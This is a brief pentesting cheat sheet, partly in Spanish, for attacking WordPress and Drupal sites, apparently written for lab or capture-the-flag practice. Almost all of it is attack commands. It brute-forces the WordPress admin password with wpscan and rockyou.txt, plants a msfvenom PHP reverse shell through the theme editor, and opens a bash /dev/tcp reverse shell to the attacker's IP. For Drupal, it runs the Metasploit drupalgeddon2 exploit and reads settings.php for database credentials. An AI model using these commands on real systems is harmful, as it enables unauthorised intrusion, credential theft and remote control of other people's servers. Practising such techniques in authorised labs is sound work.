## Wordpress

### wpscan

```bash
wpscan --url http://IP/blog --enumerate u,vp

wpscan --url http://IP/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Appearance -> Theme Editor -> Theme Footer

```bash
msfvenom -p php/reverse_php LHOST=nuestraIP LPORT=443 -f raw > pwned.php
cat pwned.php

sudo nc -nlvp 443
```

Desde la máquina victima

```bash
bash -c "sh -i >& /dev/tcp/nuestraIP/443 0>&1"
```

## Drupal

```bash
msfconsole
search drupal 7 / 8
use drupal_drupalgeddon2
set RHOST http://IP/ruta/drupal
set LHOST nuestraIP
run

shell
bash -i
find / -name settings.php 2>/dev/null
cat /var/www/html/sites/default/settings.php
```
